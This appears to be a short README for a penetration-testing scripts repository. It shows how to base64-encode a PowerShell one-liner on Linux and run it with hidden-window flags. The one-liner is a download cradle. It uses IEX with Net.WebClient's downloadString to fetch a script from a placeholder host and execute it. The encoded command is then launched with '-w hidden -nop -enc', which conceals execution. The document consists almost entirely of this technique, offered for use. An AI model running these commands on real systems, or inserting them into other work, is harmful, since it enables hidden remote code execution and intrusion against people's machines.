# PenTesting-Scripts
A ton of helpful tools


## Powershell Base64 on Linux

In a terminal run the following command to encode your powershell one-liner
```bash
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://site.com/script.js')" | iconv -t UTF-16LE | base64 -w 0
```

Now in Powershell run the following command to test encoding:
```powershell
powershell -w hidden -nop -enc <BASE_64_STRING>
```
